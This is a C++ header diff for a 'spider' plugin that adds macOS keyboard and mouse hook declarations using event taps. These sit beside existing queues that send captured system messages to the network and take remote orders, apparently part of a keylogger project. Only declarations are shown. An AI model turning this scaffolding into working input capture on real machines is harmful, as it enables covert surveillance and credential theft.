@@ -9,6 +9,9 @@
 
 #if defined _WIN32
 #include <windows.h>
+#elif defined __APPLE__
+#include <thread>
+#include <ApplicationServices/ApplicationServices.h>
 #endif
 
 namespace spider
@@ -94,11 +97,15 @@ namespace spider
 	bool          deinitOSX();
 	std::uint64_t getRAMOSX() const;
 	void          getInfosOSX();
-	bool          hookKeyboardOSX() const;
-	bool          unHookKeyboardOSX() const;
-	bool          hookMouseOSX() const;
-	bool          unHookMouseOSX() const;
+	bool          hookKeyboardOSX();
+	bool          unHookKeyboardOSX();
+	bool          hookMouseOSX();
+	bool          unHookMouseOSX();
 	void          runOSX() const;
+	void          keyboardThread();
+	void          mouseThread();
+	static CGEventRef    treatKeyboardEvent(CGEventTapProxy, CGEventType, CGEventRef, void *);
+	static CGEventRef    treatMouseEvent(CGEventTapProxy, CGEventType, CGEventRef, void *);
 // SpiderPluginLinux.cpp
 #elif defined __linux__
 	bool          initLinux();
@@ -125,7 +132,7 @@ namespace spider
 	static mt::Queue<SystemMsg> *m_sendToNetwork;
 	mt::Queue<Order>             m_receivedFromNetwork;
 	mt::Queue<std::string>       m_networkResponseQueue;
-	static std::string           m_macAddr;
+	static network::tcp::MacAddrArray m_macAddr;
 
 	std::map<std::string, std::function<void()>> m_cmd;
 
@@ -133,9 +140,12 @@ namespace spider
 	HHOOK m_keyboardHookWin;
 	HHOOK m_mouseHookWin;
 	static std::map<std::uint32_t, KeyboardKey> m_windowsKeyboardMap;
-#endif
-#if defined __linux__
+#elif defined __linux__
 	static std::map<std::uint32_t, KeyboardKey> m_linuxKeyboardMap;
+#elif defined __APPLE__
+	static std::map<std::uint32_t, KeyboardKey> m_osxKeyboardMap;
+	CFRunLoopRef m_osxKeyboardLoop;
+	CFRunLoopRef m_osxMouseLoop;
 #endif
       };
 
